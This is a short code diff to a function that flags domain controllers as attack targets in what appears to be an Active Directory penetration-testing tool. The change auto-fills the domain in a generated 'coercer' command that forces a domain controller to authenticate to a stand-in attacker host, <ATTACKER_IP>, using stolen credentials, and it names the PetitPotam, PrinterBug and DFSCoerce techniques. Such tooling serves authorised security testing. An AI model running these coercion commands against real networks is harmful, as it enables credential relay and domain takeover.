@@ -267,6 +267,7 @@ def find_dc_servers(G: "nx.DiGraph") -> list[QuickWin]:
         if not is_dc:
             continue
         name = G.nodes[nid].get("name", nid)
+        d = _domain_of(G, nid)
         out.append(QuickWin(
             category="Domain Controller",
             node_id=nid,
@@ -275,7 +276,7 @@ def find_dc_servers(G: "nx.DiGraph") -> list[QuickWin]:
             detail="Coercion targets: PetitPotam (MS-EFSR), PrinterBug (MS-RPRN), DFSCoerce (MS-DFSNM).",
             commands=[
                 "# Coerce auth from this DC (as any authenticated user):",
-                f"coercer coerce -u '<owned_user>' -p '<owned_pass>' -d <DOMAIN> -l <ATTACKER_IP> -t {name}",
+                f"coercer coerce -u '<owned_user>' -p '<owned_pass>' -d {d} -l <ATTACKER_IP> -t {name}",
             ],
         ))
     return out
